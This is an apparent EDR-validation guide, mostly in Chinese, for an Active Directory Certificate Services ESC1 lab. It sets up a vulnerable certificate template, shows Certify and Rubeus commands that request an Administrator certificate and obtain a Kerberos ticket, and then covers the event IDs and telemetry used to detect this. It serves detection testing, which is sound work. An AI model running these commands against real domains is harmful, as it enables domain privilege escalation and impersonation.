# AD CS ESC1 Vulnerability Validation Guide

本文件旨在提供完整的 ESC1 (AD CS Certificate Abuse) 漏洞環境建置與驗證流程，用於測試 EDR 系統的偵測與防禦能力。

## 環境資訊

- AD CS 主機 (CA Server): 10.0.0.206 (SME-SWP-W-AD)
- CA 名稱: sme-SME-SWP-W-AD-CA
- 攻擊測試機: 10.0.0.x (已安裝 Certify 與 Rubeus)
- 目標: 驗證 EDR 是否能偵測異常憑證申請與後續的身分偽冒行為

---

## ⚠️ 前置作業：啟用稽核日誌 (AD CS 主機端)

若不啟用以下稽核原則，您將無法在 Windows Event Log 中看到關鍵的攻擊跡象 (4768 等)，導致 EDR 驗證失效。

### 啟用 CA 稽核與系統稽核

- 在 AD CS 主機執行 certsrv.msc，CA Properties → Auditing 勾選 Issue and manage certificate requests，重啟 CertSvc

```powershell
certutil -setreg CA\AuditFilter 127
Restart-Service CertSvc
```

- 在 OS 層級開啟：

```powershell
auditpol /set /subcategory:"Certification Services" /success:enable /failure:enable
auditpol /set /subcategory:"Kerberos Authentication Service" /success:enable /failure:enable
auditpol /set /subcategory:"Logon" /success:enable /failure:enable
```

---

## 第一階段：漏洞環境建置 (AD CS 主機端)

- certtmpl.msc → Duplicate "User" (Windows Server 2003 Enterprise)
- General: Template display name = ESC1
- Request Handling: Allow private key to be exported
- Subject Name: Supply in the request
- Extensions → Application Policies: 包含 Client Authentication (1.3.6.1.5.5.7.3.2)
- Security: 加入 Domain Users，勾 Read/Enroll (不勾 Write 權限，以免形成 ESC4)
- Issuance Requirements: 確認未勾 Manager approval

- certsrv.msc → Certificate Templates → New → Certificate Template to Issue → ESC1

---

## 第二階段：攻擊模擬 (測試機端)

### 漏洞偵察

```powershell
& "./Certify.exe" enum-templates /ca:10.0.0.206\sme-SME-SWP-W-AD-CA /vulnerable
```

### 申請惡意憑證 (以 Administrator UPN)

```powershell
& "./Certify.exe" request /ca:10.0.0.206\sme-SME-SWP-W-AD-CA /template:ESC1 /upn:Administrator@sme.local /out-file:admin.pem
```

### 使用憑證進行 PKINIT (取得 TGT)

```powershell
$pem = (Get-Content "./admin.pem" -Raw).Replace("`r`n","").Replace("`n","")
./Rubeus.exe asktgt /user:Administrator /certificate:$pem /password:certify /domain:sme.local /dc:10.0.0.206 /ptt
```

---

## 第三階段：EDR 與日誌驗證

### Windows Event Logs：正確認知與限制

- 4886 (CA: 接收申請)、4887 (CA: 簽發憑證)：
  - Windows CA 設計限制：Attributes 欄位一般**不會記錄 SAN**（即使 AuditFilter=127）
  - 可用價值：記錄 Requester、Template、RequestId、時間點，作為關聯依據
- 4768 (DC: Kerberos TGT 請求／PKINIT)：
  - 關鍵偵測指標；可觀察 Certificate Information 與短時間內頻繁 TGT 申請
- 4624 (DC: 成功登入)：
  - 登入類型 3/9，受測帳號是否為高權限

### 實用關聯策略（替代 SAN 顯示）

- 以 4886/4887 的 Requester=低權限、Template=ESC1、RequestId=K 對照當時段的 4768（PKINIT），形成攻擊鏈
- 直接於 CA 資料庫查憑證之 SAN：
  - certsrv.msc → Issued Certificates → 最新憑證 → Details → Subject Alternative Name → 應見 Principal Name=Administrator@sme.local
- 以攻擊輸出之憑證解析 SAN（PFX Base64 範例）：

```powershell
# 將 Certify 輸出的 Base64 PFX 置於 $b64
$b64 = Get-Content "./admin.pem" -Raw
$pfxBytes = [Convert]::FromBase64String($b64)
$cert = [System.Security.Cryptography.X509Certificates.X509Certificate2]::new($pfxBytes, "certify")
$sanExt = $cert.Extensions | Where-Object { $_.Oid.Value -eq '2.5.29.17' }
[System.Security.Cryptography.AsnEncodedData]::new($sanExt.Oid,$sanExt.RawData).Format($true)
```

- KDC 4768 的 Certificate Information 與上述 SAN/Requester 交叉比對，形成 IOC：
  - 低權限帳號 request → 近時段高權憑證 PKINIT → 成功登入/遠端資源存取

### Endpoint Telemetry（EDR）

- Process：Certify.exe / Rubeus.exe（可能更名，需行為特徵）
- CommandLine：/ca, /template, /upn, asktgt, /ptt 等
- .NET Assembly Load：ETW 151/154（Microsoft-Windows-DotNETRuntime）
- Network：對 CA/DC 的 88/135/389/445/80/443 等端口之異常關聯

---

## Troubleshooting

- 4886/4887 Attributes 空白屬**正常行為**；請改以 CA 資料庫與憑證內容解析佐證 SAN
- AuditFilter=127 已是完整；核心指標請落在 4768 與行為關聯

---

## 結論

- 以 ESC1 範本造成憑證濫用，搭配 4768 PKINIT 與 CA/DB 憑證細節關聯，能有效驗證 EDR/SIEM 是否抓到攻擊鏈
